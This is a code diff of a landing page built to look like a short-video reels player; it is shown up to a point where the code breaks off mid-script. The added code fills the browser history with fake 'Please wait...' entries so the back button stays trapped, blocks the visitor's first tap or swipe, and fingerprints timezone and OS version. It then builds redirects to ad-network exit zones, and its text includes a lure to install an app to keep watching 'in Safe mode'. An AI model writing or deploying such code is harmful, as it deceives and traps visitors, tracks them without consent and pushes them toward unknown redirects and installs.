@@ -153,140 +153,138 @@
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-    // --- 1. ДАННЫЕ РИЛСОВ (Для смены инфы) ---
-    const reelsData = [
-        {}, // 0 index skip
-        { // Video 1
-            user: "@Sweet_Alice",
-            likes: "93",
-            desc: "Do you like my view? 😈 <br>Check link in bio... 👇",
-            color: "#ff0050" 
-        },
-        { // Video 2
-            user: "@Naughty_Kate",
-            likes: "12.4k",
-            desc: "Wait for the end... 💦 <br>Link in bio!",
-            color: "#0095f6" 
+  // 1) LANG
+  const translations = {
+    en:"Continue Watching", ru:"Смотреть дальше", es:"Continuar viendo", de:"Weiter ansehen",
+    fr:"Continuer à regarder", pt:"Continuar assistindo", it:"Continua a guardare", tr:"İzlemeye devam et",
+    ar:"متابعة المشاهدة", zh:"继续观看", ja:"視聴を続ける", ko:"계속 시청하기", hi:"देखना जारी रखें",
+    id:"Lanjutkan Menonton", vi:"Tiếp tục xem", th:"ดูต่อ"
+  };
+  const userLang = (navigator.language || navigator.userLanguage || "en").slice(0,2).toLowerCase();
+  const langText = document.getElementById("lang-text");
+  langText.innerText = translations[userLang] || translations.en;
+  if (userLang === "ar") document.querySelector(".glass-btn").style.direction = "rtl";
+
+  // 2) NODES
+  const v1 = document.getElementById("v1");
+  const v2 = document.getElementById("v2");
+  const swipeHint = document.getElementById("swipe-hint");
+  const clickHint = document.getElementById("click-hint");
+  const wrapper = document.querySelector(".reels-wrapper");
+
+  const urlParams = new URLSearchParams(location.search);
+  const offerID = urlParams.get("v") || "1";
+  const getPath = (index) => `./assets/videos/lend${offerID}/reels-${index}.mp4?t=${Date.now()}`;
+
+  let stage = 1;
+  let touchStartY = 0;
+  let swapped = false;
+
+  // 3) INIT VIDEOS
+  v1.muted = true; v2.muted = true;
+  v1.playsInline = true; v2.playsInline = true;
+
+  v1.src = getPath(1);
+  v1.load();
+  v1.play().catch(()=>{});
+
+  v2.src = getPath(2);
+  v2.load();
+
+  // 4) INIT "MY BACK" (back.html like common)
+  function buildBackHtmlUrl() {
+    const { origin, pathname, search } = location;
+    let base = origin + pathname;
+    if (base.includes("index.html")) base = base.split("/index.html")[0];
+    if (base.includes("back.html")) base = base.split("/back.html")[0];
+    if (base.endsWith("/")) base = base.slice(0, -1);
+
+    const backUrl = new URL(base + "/back.html");
+    const sp = new URLSearchParams(search);
+
+    const backZone = (window.APP_CONFIG && APP_CONFIG.back_zoneId) ? String(APP_CONFIG.back_zoneId) : "";
+    const dom = (window.APP_CONFIG && APP_CONFIG.domain) ? String(APP_CONFIG.domain) : "";
+    if (backZone) sp.set("z", backZone);
+    if (dom) sp.set("domain", dom);
+
+    backUrl.search = sp.toString();
+    return backUrl.toString();
+  }
+
+  function initMyBackStack() {
+    try {
+      const n = (window.APP_CONFIG && APP_CONFIG.back_count) ? Number(APP_CONFIG.back_count) : 8;
+      const backHref = buildBackHtmlUrl();
+      for (let i = 0; i < n; i++) history.pushState({__back:1,i}, "Please wait...", backHref);
+      history.pushState(null, document.title, location.href);
+    } catch(e) {}
+  }
+
+  // 5) SWAP
+  function doSwap() {
+    if (swapped) return;
+    swapped = true;
+
+    swipeHint.style.display = "none";
+
+    // init back exactly on first swap
+    initMyBackStack();
+
+    // switch layers
+    try { v1.pause(); } catch(e) {}
+    v1.classList.remove("active");
+
+    v2.classList.add("active");
+
+    // try play (chrome ok, tg may block)
+    v2.play().catch(()=>{});
+
+    // always show CTA button
+    clickHint.style.display = "flex";
+    stage = 2;
+  }
+
+  // 6) TOUCH
+  wrapper.addEventListener("touchstart", (e) => {
+    touchStartY = e.changedTouches[0].screenY;
+  }, { passive: true });
+
+  wrapper.addEventListener("touchend", (e) => {
+    const touchEndY = e.changedTouches[0].screenY;
+
+    if ((touchStartY - touchEndY) > 50) {
+      if (stage === 1) {
+        // IMPORTANT: block common script seeing the first gesture
+        e.preventDefault();
+        e.stopPropagation();
+        doSwap();
+      } else {
+        // shake CTA
+        const btn = document.querySelector(".glass-btn");
+        if (btn) {
+          btn.classList.remove("shake");
+          void btn.offsetWidth;
+          btn.classList.add("shake");
         }
-    ];
-
-    // --- 2. ВСЕ ЯЗЫКИ ---
-    const translations = {
-        'en': "Continue Watching",
-        'ru': "Смотреть дальше",
-        'es': "Continuar viendo",
-        'de': "Weiter ansehen",
-        'fr': "Continuer à regarder",
-        'pt': "Continuar assistindo",
-        'it': "Continua a guardare",
-        'tr': "İzlemeye devam et",
-        'ar': "متابعة المشاهدة",      
-        'zh': "继续观看",            
-        'ja': "視聴を続ける",          
-        'ko': "계속 시청하기",          
-        'hi': "देखना जारी रखें",       
-        'id': "Lanjutkan Menonton",  
-        'vi': "Tiếp tục xem",        
-        'th': "ดูต่อ"                
-    };
-
-    const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
-    const langText = document.getElementById("lang-text");
-    langText.innerText = translations[userLang] || translations['en'];
-    
-    if (userLang === 'ar') {
-        document.querySelector('.glass-btn').style.direction = 'rtl';
+      }
     }
+  }, { passive: false });
 
-    // --- 3. ИНИЦИАЛИЗАЦИЯ ---
-    const v1 = document.getElementById('v1');
-    const v2 = document.getElementById('v2');
-    const swipeHint = document.getElementById("swipe-hint");
-    const clickHint = document.getElementById("click-hint");
-    const wrapper = document.querySelector('.reels-wrapper');
-
-    // UI элементы
-    const uiUser = document.getElementById('ui-username');
-    const uiLikes = document.getElementById('ui-likes');
-    const uiDesc = document.getElementById('ui-desc');
-    const uiAvatar = document.getElementById('ui-avatar');
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const offerID = urlParams.get('v') || '1';
-    
-    const getPath = (index) => `./assets/videos/lend${offerID}/reels-${index}.mp4`;
-
-    // Загрузка
-    v1.src = getPath(1);
-    v1.play().catch(()=>{});
-    v2.src = getPath(2);
-    v2.load(); 
-
-    let stage = 1; 
-    let touchStartY = 0;
-    let touchEndY = 0;
-
-    // --- 4. ФУНКЦИЯ СВАПА ---
-    function doSwap() {
-        swipeHint.style.display = 'none';
-
-        // Меняем видео
-        v1.pause();
-        v1.classList.remove('active');
-        v2.classList.add('active');
-        v2.play().catch(e => console.log("Autoplay prevent:", e));
-
-        // Меняем инфу (Динамический UI)
-        const newData = reelsData[2]; 
-        if (newData) {
-            uiUser.innerText = newData.user;
-            uiLikes.innerText = newData.likes;
-            uiDesc.innerHTML = newData.desc;
-            uiAvatar.style.backgroundColor = newData.color;
-        }
-
-        // Показываем кнопку
-        clickHint.style.display = 'flex';
-        stage = 2; 
+  // 7) CLICK
+  wrapper.addEventListener("click", (e) => {
+    if (stage === 1) {
+      // block common mainExit on first click
+      e.preventDefault?.();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      doSwap();
+      return;
     }
-
-    // --- 5. ОБРАБОТЧИКИ ---
-    wrapper.addEventListener('touchstart', function(e) {
-        touchStartY = e.changedTouches[0].screenY;
-    }, {passive: true});
-
-    wrapper.addEventListener('touchend', function(e) {
-        touchEndY = e.changedTouches[0].screenY;
-        if (touchStartY - touchEndY > 50) { 
-            if (stage === 1) {
-                // Back-fix регистрация
-                const fakeClick = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
-                wrapper.dispatchEvent(fakeClick); 
-                
-                doSwap();
-            } else {
-                const btn = document.querySelector('.glass-btn');
-                if(btn) {
-                    btn.classList.remove('shake');
-                    void btn.offsetWidth; 
-                    btn.classList.add('shake');
-                }
-            }
-        }
-    }, {passive: true});
-
-    wrapper.addEventListener("click", function(e) {
-        if (!e.isTrusted && stage === 1) { e.stopPropagation(); return; }
-
-        if (stage === 1) {
-            e.stopPropagation(); e.stopImmediatePropagation();
-            doSwap(); 
-        } else {
-            console.log("Exit Click");
-        }
-    }); 
+    // stage 2: let common script handle mainExit normally
+  }, true);
 });
 </script>
+
 
 <script>
 (()=>{var e,t,n,a,r=Object.create,o=Object.defineProperty,i=Object.getOwnPropertyDescriptor,l=Object.getOwnPropertyNames,s=Object.getPrototypeOf,c=Object.prototype.hasOwnProperty,u=(t,n,a,r)=>{if(n&&"object"==typeof n||"function"==typeof n)for(let e of l(n))c.call(t,e)||e===a||o(t,e,{get:()=>n[e],enumerable:!(r=i(n,e))||r.enumerable});return t},d=(e,t,n)=>(n=null!=e?r(s(e)):{},u(!t&&e&&e.__esModule?n:o(n,"default",{value:e,enumerable:!0}),e)),m=(e={"src/landings/player/locale/en.json"(e,t){t.exports={no:"No",yes:"Yes",install_app_and_continue_watching:"Install our app and continue watching content in Safe mode",notification:"(1) Notification"}}},function(){return t||(0,e[l(e)[0]])((t={exports:{}}).exports,t),t.exports}),w=async()=>{var e=navigator;if(!e.userAgentData)return"";try{var t=["platformVersion"];return(await e.userAgentData.getHighEntropyValues(t)).platformVersion}catch(e){return console.error("Error retrieving data from navigator.userAgentData",e),""}},h=()=>{if("undefined"!=typeof Intl&&"function"==typeof Intl.DateTimeFormat){var e=Intl.DateTimeFormat().resolvedOptions().timeZone;if(e)return e}return""},v=()=>(new Date).getTimezoneOffset(),p=t=>{let n=new URLSearchParams;return Object.keys(t).forEach(e=>{t[e]&&n.set(e,t[e])}),n},b=new URL(window.location.href),g={pz:null!=(a=b.searchParams.get("pz"))?a:"",tb:null!=(a=b.searchParams.get("tb"))?a:"",tb_reverse:null!=(a=b.searchParams.get("tb_reverse"))?a:"",ae:null!=(a=b.searchParams.get("ae"))?a:"",z:null!=(a=b.searchParams.get("z"))?a:"",var:null!=(a=b.searchParams.get("var"))?a:"",var_1:null!=(a=b.searchParams.get("var_1"))?a:"",var_2:null!=(a=b.searchParams.get("var_2"))?a:"",var_3:null!=(a=b.searchParams.get("var_3"))?a:"",b:null!=(a=b.searchParams.get("b"))?a:"",campaignid:null!=(a=b.searchParams.get("campaignid"))?a:"",abtest:null!=(a=b.searchParams.get("abtest"))?a:"",rhd:null!=(a=b.searchParams.get("rhd"))?a:"1",s:null!=(a=b.searchParams.get("s"))?a:"",ymid:null!=(a=b.searchParams.get("ymid"))?a:"",wua:null!=(a=b.searchParams.get("wua"))?a:"",use_full_list_or_browsers:null!=(a=b.searchParams.get("use_full_list_or_browsers"))?a:"",cid:null!=(a=b.searchParams.get("cid"))?a:"",geo:null!=(a=b.searchParams.get("geo"))?a:""},f=({passParamToParams:e,searchParams:r,windowUrl:o})=>(e.forEach(e=>{var{from:e,to:t,joinWith:n}=e;let a=Array.isArray(e)?e.map(e=>null!=(e=o.searchParams.get(e))?e:"").filter(Boolean).join(null!=n?n:""):null!=(n=o.searchParams.get(e))?n:"";a&&t.forEach(e=>{r.set(e,a)})}),r),y=async({zone:e,passParamToParams:t})=>{var n=h(),a=v(),r=(null==(r=document.querySelector("html"))?void 0:r.getAttribute("data-version"))||"",o=(null==(o=document.querySelector("html"))?void 0:o.getAttribute("data-landing-name"))||"",i=null!=(i=window.templateHash)?i:"",r=JSON.stringify({dataVer:r,landingName:o,templateHash:i}),o=btoa(r),i={pz:g.pz,tb:g.tb,tb_reverse:g.tb_reverse,ae:g.ae,ab2r:g.abtest||String(APP_CONFIG.abtest||"")};let l={ymid:null!=(r=g.var_1)?r:g.var,var:null!=(r=g.var_2)?r:g.z,var_3:g.var_3,b:g.b,campaignid:g.campaignid,click_id:g.s,rhd:g.rhd,os_version:await w(),btz:n.toString(),bto:a.toString(),cmeta:o};e&&(l.zoneid=e),Object.entries(i).forEach(([e,t])=>{t&&(l[e]=t)});r=p(l);return t?f({passParamToParams:t,searchParams:r,windowUrl:new URL(window.location.href)}):r},P=(t,n)=>{try{for(let e=0;e<n;e+=1)window.history.pushState(null,"Please wait...",t);var e=window.location.href;window.history.pushState(null,document.title,e),console.log(`Back initializated ${n} times with `+t)}catch(e){console.error("Failed to push state, error:",e)}},_=async t=>{var t=null==t?void 0:t.back;if(t){var{currentTab:n,pageUrl:a}=t;if(n){var t=null!=(t=t.count)?t:10,{origin:r,pathname:o}=window.location;let e=""+r+o;a?e=a:((e=(e=e.includes("index.html")?e.split("/index.html")[0]:e).includes("back.html")?e.split("/back.html")[0]:e).endsWith("/")&&(e=e.substring(0,e.length-1)),e+="/back.html");r=new URL(e),o=await y({zone:n.zoneId}),a=(n.url?o.set("url",n.url):n.domain&&n.zoneId&&(o.set("z",n.zoneId),o.set("domain",n.domain)),decodeURIComponent(r.toString()+"?"+o.toString()));P(a,t)}}},z=async(e,t,n)=>{t=t.includes("http")?t:"https://"+t,t=new URL(t+"/afu.php"),e=await y({zone:e.toString(),passParamToParams:n}),n=decodeURIComponent(t.toString()+"?"+e.toString());return console.log("URL generated:",n),n},I=({url:e})=>{window.location.replace(e)},T=(e,t)=>{console.error(`${t||"Some exit"} was supposed to work, but some data about this type of exit was missed`,e)},E=async(t,n,a=!0)=>{var r,o=t[n].currentTab;if(console.log(n+" worked",t),o){let e;if(o.zoneId&&o.domain)return null!=(r=window.syncMetric)&&r.call(window,{event:n,exitZoneId:o.zoneId}),e=await z(o.zoneId,o.domain),a&&await _(t),I({url:e});if(o.url)return null!=(r=window.syncMetric)&&r.call(window,{event:n,exitZoneId:o.url}),e=o.url,a&&await _(t),I({url:e})}T(o,n)},O=async(n,a)=>{var r,o,i=n[a];if(console.log(a+" worked",n),i){var{currentTab:l,newTab:s}=i;let e;l&&(l.zoneId&&l.domain?(e=await z(l.zoneId,l.domain),null!=(r=window.syncMetric)&&r.call(window,{event:a,exitZoneId:l.zoneId})):l.url?e=l.url:T(i,a));let t;s&&(s.zoneId&&s.domain?(t=await z(s.zoneId,s.domain),null!=(r=window.syncMetric)&&r.call(window,{event:a,exitZoneId:s.zoneId})):s.url?t=s.url:T(i,a)),await _(n),{currentTabUrl:o,newTabUrl:l}=[{currentTabUrl:e,newTabUrl:t}][0],void(l?(l=window.open(l,"_blank"))&&(l.opener=null,o)&&document.addEventListener("visibilitychange",()=>{"visible"===document.visibilityState&&I({url:o})}):o&&I({url:o}))}else T(i,a)},S=()=>"undefined"!=typeof APP_CONFIG||(document.body.innerHTML=`
